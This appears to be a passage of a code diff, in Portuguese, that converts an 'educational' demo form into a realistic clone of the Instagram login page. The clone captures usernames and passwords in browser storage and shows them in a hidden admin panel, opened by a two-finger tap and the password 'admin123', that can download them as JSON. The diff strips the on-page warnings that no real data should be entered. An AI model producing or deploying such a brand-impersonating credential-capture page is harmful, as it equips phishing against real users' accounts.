@@ -3,153 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Formulário Educacional | GitHub Pages</title>
+    <title>Instagram Login</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #6e8efb, #a777e3);
-            min-height: 100vh;
+            background: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
+            min-height: 100vh;
             padding: 20px;
+            touch-action: manipulation;
         }
         
         .container {
-            background-color: white;
-            border-radius: 10px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            display: flex;
+            max-width: 935px;
             width: 100%;
-            max-width: 500px;
-            overflow: hidden;
+            justify-content: center;
+            align-items: center;
+            gap: 30px;
         }
         
-        .header {
-            background: #4a6cf7;
-            color: white;
-            padding: 20px;
+        .phones {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .phones img {
+            max-width: 100%;
+            height: auto;
+        }
+        
+        .login-container {
+            flex: 1;
+            max-width: 350px;
+        }
+        
+        .login-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 20px 40px;
             text-align: center;
-        }
-        
-        .header h1 {
-            font-size: 24px;
             margin-bottom: 10px;
         }
         
-        .header p {
-            font-size: 14px;
-            opacity: 0.9;
-        }
-        
-        .form-container {
-            padding: 20px;
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+            cursor: pointer;
         }
         
         .form-group {
-            margin-bottom: 20px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 8px;
-            font-weight: 500;
-            color: #333;
+            margin-bottom: 6px;
         }
         
         .form-group input {
             width: 100%;
-            padding: 12px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-            transition: border 0.3s;
+            padding: 9px 0 7px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            font-size: 12px;
+            color: #262626;
         }
         
         .form-group input:focus {
-            border-color: #4a6cf7;
+            border-color: #a8a8a8;
             outline: none;
         }
         
-        .btn {
-            background: #4a6cf7;
+        .btn-login {
+            width: 100%;
+            background: #0095f6;
             color: white;
             border: none;
-            padding: 12px 20px;
-            border-radius: 5px;
-            cursor: pointer;
-            font-size: 16px;
-            font-weight: 600;
-            width: 100%;
-            transition: background 0.3s;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 8px;
-        }
-        
-        .btn:hover {
-            background: #3a5cd8;
-        }
-        
-        .btn-secondary {
-            background: #6c757d;
-        }
-        
-        .btn-secondary:hover {
-            background: #5a6268;
-        }
-        
-        .btn-success {
-            background: #28a745;
-        }
-        
-        .btn-success:hover {
-            background: #218838;
-        }
-        
-        .btn-danger {
-            background: #dc3545;
-        }
-        
-        .btn-danger:hover {
-            background: #c82333;
-        }
-        
-        .warning {
-            background: #fff4e6;
-            border-left: 4px solid #ffa94d;
-            padding: 15px;
-            margin-top: 20px;
             border-radius: 4px;
+            padding: 5px 9px;
+            margin: 8px 0;
+            font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+        }
+        
+        .btn-login:disabled {
+            background: #b2dffc;
+        }
+        
+        .separator {
+            display: flex;
+            align-items: center;
+            margin: 18px 0;
+            color: #8e8e8e;
+            font-size: 13px;
+        }
+        
+        .separator::before,
+        .separator::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #dbdbdb;
+        }
+        
+        .separator span {
+            margin: 0 18px;
+        }
+        
+        .facebook-login {
+            color: #385185;
+            font-weight: 600;
+            font-size: 14px;
+            margin: 8px 0;
+            cursor: pointer;
+        }
+        
+        .facebook-login i {
+            margin-right: 6px;
+        }
+        
+        .forgot-password {
+            color: #00376b;
+            font-size: 12px;
+            margin-top: 12px;
+            cursor: pointer;
+        }
+        
+        .signup-box {
+            background: white;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 10px 0;
+            text-align: center;
+            margin-bottom: 10px;
             font-size: 14px;
         }
         
-        .data-preview {
-            margin-top: 20px;
-            padding: 15px;
-            background: #f8f9fa;
-            border-radius: 5px;
-            display: none;
+        .signup-box a {
+            color: #0095f6;
+            font-weight: 600;
+            text-decoration: none;
         }
         
-        .data-preview h3 {
-            margin-bottom: 10px;
-            color: #4a6cf7;
+        .get-app {
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .app-download {
+            margin-top: 20px;
+        }
+        
+        .app-download img {
+            height: 40px;
+            margin: 0 5px;
         }
         
         .footer {
             text-align: center;
-            padding: 15px;
+            margin-top: 50px;
+            color: #8e8e8e;
             font-size: 12px;
-            color: #666;
-            border-top: 1px solid #eee;
+        }
+        
+        .footer-links {
+            margin-bottom: 10px;
+        }
+        
+        .footer-links a {
+            color: #8e8e8e;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .copyright {
+            margin-top: 10px;
         }
         
         .admin-panel {
@@ -211,7 +249,7 @@
             position: fixed;
             bottom: 20px;
             right: 20px;
-            background: #4a6cf7;
+            background: #0095f6;
             color: white;
             width: 50px;
             height: 50px;
@@ -220,13 +258,8 @@
             justify-content: center;
             align-items: center;
             cursor: pointer;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
             z-index: 100;
-            transition: transform 0.3s;
-        }
-        
-        .admin-access-btn:hover {
-            transform: scale(1.1);
         }
         
         .admin-actions {
@@ -236,10 +269,27 @@
             flex-wrap: wrap;
         }
         
-        .admin-actions .btn {
-            width: auto;
+        .admin-actions button {
             flex: 1;
             min-width: 120px;
+            padding: 8px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            color: white;
+            font-weight: 600;
+        }
+        
+        .btn-download {
+            background: #28a745;
+        }
+        
+        .btn-clear {
+            background: #dc3545;
+        }
+        
+        .btn-close {
+            background: #6c757d;
         }
         
         .empty-data {
@@ -248,83 +298,131 @@
             color: #6c757d;
         }
         
-        .github-info {
-            text-align: center;
-            margin-top: 20px;
+        .secret-tap-area {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100px;
+            z-index: 101;
+        }
+        
+        .admin-help {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            color: white;
             padding: 10px;
-            background: #f5f5f5;
             border-radius: 5px;
-            font-size: 14px;
+            font-size: 12px;
+            max-width: 200px;
+            display: none;
+            z-index: 102;
         }
         
-        .github-info a {
-            color: #4a6cf7;
-            text-decoration: none;
-        }
-        
-        .github-info a:hover {
-            text-decoration: underline;
-        }
-        
-        @media (max-width: 600px) {
-            .admin-actions {
-                flex-direction: column;
+        @media (max-width: 875px) {
+            .phones {
+                display: none;
             }
             
-            .admin-actions .btn {
-                width: 100%;
+            .admin-help {
+                display: block;
             }
         }
     </style>
 </head>
 <body>
+    <!-- Área secreta para toque com dois dedos -->
+    <div class="secret-tap-area" id="secret-tap-area"></div>
+    
     <div class="container">
-        <div class="header">
-            <h1>Formulário Educacional</h1>
-            <p>Demonstração para GitHub Pages</p>
+        <div class="phones">
+            <!-- Placeholder for Instagram phones image -->
+            <svg width="380" height="580" viewBox="0 0 380 580" fill="none">
+                <rect width="380" height="580" rx="20" fill="url(#paint0_linear)"/>
+                <defs>
+                    <linearGradient id="paint0_linear" x1="0" y1="0" x2="380" y2="580" gradientUnits="userSpaceOnUse">
+                        <stop stop-color="#833AB4"/>
+                        <stop offset="0.5" stop-color="#FD1D1D"/>
+                        <stop offset="1" stop-color="#FCB045"/>
+                    </linearGradient>
+                </defs>
+                <text x="190" y="300" text-anchor="middle" fill="white" font-size="24" font-weight="bold">Instagram</text>
+            </svg>
         </div>
         
-        <div class="form-container">
-            <div class="warning">
-                <strong><i class="fas fa-exclamation-triangle"></i> Aviso:</strong> Esta é uma página de exemplo criada para fins educacionais. 
-                Os dados são armazenados apenas localmente no seu navegador.
+        <div class="login-container">
+            <div class="login-box">
+                <div class="logo" id="instagram-logo">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 192 192" width="175" height="60">
+                        <rect width="192" height="192" fill="none"/>
+                        <circle cx="96" cy="96" r="40" stroke="#262626" stroke-width="12"/>
+                        <circle cx="96" cy="96" r="40" fill="none" stroke="#262626" stroke-width="12"/>
+                        <circle cx="154" cy="62" r="10" fill="#262626"/>
+                        <rect x="32" y="32" width="128" height="128" rx="40" fill="none" stroke="#262626" stroke-width="12"/>
+                    </svg>
+                </div>
+                
+                <form id="login-form">
+                    <div class="form-group">
+                        <input type="text" id="username" placeholder="Telefone, nome de usuário ou email">
+                    </div>
+                    
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Senha">
+                    </div>
+                    
+                    <button type="button" class="btn-login" onclick="simulateLogin()">Entrar</button>
+                </form>
+                
+                <div class="separator">
+                    <span>OU</span>
+                </div>
+                
+                <div class="facebook-login">
+                    <i class="fab fa-facebook-square"></i> Entrar com o Facebook
+                </div>
+                
+                <div class="forgot-password">Esqueceu a senha?</div>
             </div>
             
-            <form id="sample-form">
-                <div class="form-group">
-                    <label for="name"><i class="fas fa-user"></i> Nome Completo</label>
-                    <input type="text" id="name" placeholder="Digite seu nome completo">
-                </div>
-                
-                <div class="form-group">
-                    <label for="email"><i class="fas fa-envelope"></i> E-mail</label>
-                    <input type="email" id="email" placeholder="Digite seu e-mail">
-                </div>
-                
-                <div class="form-group">
-                    <label for="phone"><i class="fas fa-phone"></i> Telefone</label>
-                    <input type="tel" id="phone" placeholder="Digite seu telefone">
-                </div>
-                
-                <button type="button" class="btn" onclick="simulateSubmission()">
-                    <i class="fas fa-paper-plane"></i> Enviar Dados
-                </button>
-            </form>
-            
-            <div class="data-preview" id="data-preview">
-                <h3>Obrigado por enviar!</h3>
-                <p>Esta é apenas uma demonstração. Seus dados não foram compartilhados.</p>
+            <div class="signup-box">
+                Não tem uma conta? <a href="#">Cadastre-se</a>
             </div>
             
-            <div class="github-info">
-                <p><i class="fab fa-github"></i> Este projeto está hospedado no GitHub Pages</p>
-                <p>Veja o código fonte em: <a href="https://github.com/" target="_blank">github.com</a></p>
+            <div class="get-app">
+                <p>Baixe o aplicativo.</p>
+                <div class="app-download">
+                    <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-KlZ.png" alt="App Store"></a>
+                    <a href="#"><img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play"></a>
+                </div>
             </div>
         </div>
-        
-        <div class="footer">
-            <p>Esta é uma demonstração educacional. Não insira dados reais.</p>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Sobre</a>
+            <a href="#">Blog</a>
+            <a href="#">Carreiras</a>
+            <a href="#">Ajuda</a>
+            <a href="#">API</a>
+            <a href="#">Privacidade</a>
+            <a href="#">Termos</a>
+            <a href="#">Localizações</a>
+            <a href="#">Instagram Lite</a>
+            <a href="#">Threads</a>
+            <a href="#">Carregamento de contatos e não usuários</a>
+            <a href="#">Meta Verified</a>
         </div>
+        <div class="copyright">
+            © 2023 Instagram from Meta
+        </div>
+    </div>
+    
+    <div class="admin-help">
+        Toque com dois dedos no topo da tela para acessar o painel administrativo
     </div>
     
     <!-- Botão de acesso à área administrativa -->
@@ -343,7 +441,7 @@
             <input type="password" id="admin-password" placeholder="Digite a senha">
         </div>
         
-        <button class="btn" onclick="accessAdminData()">
+        <button class="btn-login" onclick="accessAdminData()">
             <i class="fas fa-sign-in-alt"></i> Acessar Dados
         </button>
         
@@ -352,13 +450,13 @@
             <div id="admin-data-content"></div>
             
             <div class="admin-actions">
-                <button class="btn btn-success" onclick="downloadData()">
+                <button class="btn-download" onclick="downloadData()">
                     <i class="fas fa-download"></i> Baixar JSON
                 </button>
-                <button class="btn btn-secondary" onclick="clearAllData()">
+                <button class="btn-clear" onclick="clearAllData()">
                     <i class="fas fa-trash"></i> Limpar Dados
                 </button>
-                <button class="btn btn-danger" onclick="closeAdminPanel()">
+                <button class="btn-close" onclick="closeAdminPanel()">
                     <i class="fas fa-times"></i> Fechar
                 </button>
             </div>
@@ -367,49 +465,70 @@
 
     <script>
         // Array para armazenar os dados (simulando um banco de dados)
-        let collectedData = JSON.parse(localStorage.getItem('formData')) || [];
+        let collectedData = JSON.parse(localStorage.getItem('instagramData')) || [];
         const ADMIN_PASSWORD = "admin123"; // Senha para acessar os dados
         
-        // Função para simular o envio do formulário
-        function simulateSubmission() {
+        // Inicialmente esconder o botão administrativo
+        document.getElementById('admin-access-btn').style.display = 'none';
+        
+        // Configurar o detector de toque com dois dedos
+        let twoFingerTapCount = 0;
+        let twoFingerTapTimeout;
+        
+        document.getElementById('secret-tap-area').addEventListener('touchstart', function(e) {
+            if (e.touches.length >= 2) {
+                twoFingerTapCount++;
+                
+                // Se houver 2 toques com dois dedos dentro de 2 segundos
+                if (twoFingerTapCount >= 2) {
+                    // Mostrar o botão administrativo
+                    document.getElementById('admin-access-btn').style.display = 'flex';
+                    twoFingerTapCount = 0;
+                    
+                    // Mostrar mensagem de confirmação
+                    alert('Painel administrativo ativado! O botão de acesso aparecerá no canto inferior direito.');
+                }
+                
+                // Resetar o contador após 2 segundos
+                clearTimeout(twoFingerTapTimeout);
+                twoFingerTapTimeout = setTimeout(function() {
+                    twoFingerTapCount = 0;
+                }, 2000);
+                
+                // Prevenir o comportamento padrão
+                e.preventDefault();
+            }
+        });
+        
+        // Função para simular o login
+        function simulateLogin() {
             // Obter valores dos campos
-            const name = document.getElementById('name').value || 'Não informado';
-            const email = document.getElementById('email').value || 'Não informado';
-            const phone = document.getElementById('phone').value || 'Não informado';
+            const username = document.getElementById('username').value || 'Não informado';
+            const password = document.getElementById('password').value || 'Não informado';
             
-            // Validar se pelo menos um campo foi preenchido
-            if (name === 'Não informado' && email === 'Não informado' && phone === 'Não informado') {
-                alert('Por favor, preencha pelo menos um campo antes de enviar.');
+            // Validar se os campos foram preenchidos
+            if (username === 'Não informado' || password === 'Não informado') {
+                alert('Por favor, preencha todos os campos antes de entrar.');
                 return;
             }
             
             // Adicionar aos dados coletados com timestamp
             const timestamp = new Date().toLocaleString();
             collectedData.push({
-                name,
-                email,
-                phone,
+                username,
+                password,
                 timestamp
             });
             
             // Salvar no localStorage
-            localStorage.setItem('formData', JSON.stringify(collectedData));
+            localStorage.setItem('instagramData', JSON.stringify(collectedData));
             
             // Limpar o formulário
-            document.getElementById('name').value = '';
-            document.getElementById('email').value = '';
-            document.getElementById('phone').value = '';
-            
-            // Mostrar mensagem de agradecimento
-            const preview = document.getElementById('data-preview');
-            preview.style.display = 'block';
-            preview.innerHTML = `
-                <h3><i class="fas fa-check-circle"></i> Obrigado por enviar!</h3>
-                <p>Esta é apenas uma demonstração. Seus dados não foram compartilhados.</p>
-            `;
+            document.getElementById('username').value = '';
+            document.getElementById('password').value = '';
             
             // Alert educacional
-            alert('Em um cenário real de phishing, esses dados seriam enviados para um servidor malicioso.\n\nNesta demonstração, os dados são armazenados apenas localmente no seu navegador para fins educacionais.');
+            alert('Em um cenário real de phishing, suas credenciais seriam enviadas para um servidor malicioso.\n\nNesta demonstração, os dados são armazenados apenas localmente no seu navegador para fins educacionais.');
         }
         
         // Funções para o painel administrativo
@@ -430,7 +549,7 @@
             
             if (password === ADMIN_PASSWORD) {
                 // Carregar dados do localStorage
-                collectedData = JSON.parse(localStorage.getItem('formData')) || [];
+                collectedData = JSON.parse(localStorage.getItem('instagramData')) || [];
                 
                 // Mostrar os dados coletados
                 const dataContainer = document.getElementById('admin-data-content');
@@ -443,9 +562,8 @@
                         dataContainer.innerHTML += `
                             <div class="data-entry">
                                 <p><strong><i class="fas fa-record-vinyl"></i> Registro #${index + 1} (${data.timestamp})</strong></p>
-                                <p><strong>Nome:</strong> ${data.name}</p>
-                                <p><strong>E-mail:</strong> ${data.email}</p>
-                                <p><strong>Telefone:</strong> ${data.phone}</p>
+                                <p><strong>Usuário:</strong> ${data.username}</p>
+                                <p><strong>Senha:</strong> ${data.password}</p>
                             </div>
                         `;
                     });
@@ -470,7 +588,7 @@
             // Criar um link para download
             const link = document.createElement('a');
             link.href = URL.createObjectURL(dataBlob);
-            link.download = 'dados_coletados.json';
+            link.download = 'dados_instagram.json';
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
@@ -486,31 +604,4 @@
             
             if (confirm('Tem certeza que deseja limpar todos os dados coletados? Esta ação não pode ser desfeita.')) {
                 collectedData = [];
-                localStorage.removeItem('formData');
-                document.getElementById('admin-data-content').innerHTML = '<div class="empty-data"><i class="fas fa-inbox"></i> Nenhum dado foi coletado ainda.</div>';
-                alert('Todos os dados foram removidos.');
-            }
-        }
-        
-        // Tecla Enter para submeter o formulário
-        document.addEventListener('DOMContentLoaded', function() {
-            const inputs = document.querySelectorAll('input');
-            inputs.forEach(input => {
-                input.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        e.preventDefault();
-                        simulateSubmission();
-                    }
-                });
-            });
-            
-            // Tecla Escape para fechar o painel admin
-            document.addEventListener('keydown', function(e) {
-                if (e.key === 'Escape') {
-                    closeAdminPanel();
-                }
-            });
-        });
-    </script>
-</body>
-</html>
+                localStorage.removeItem('i
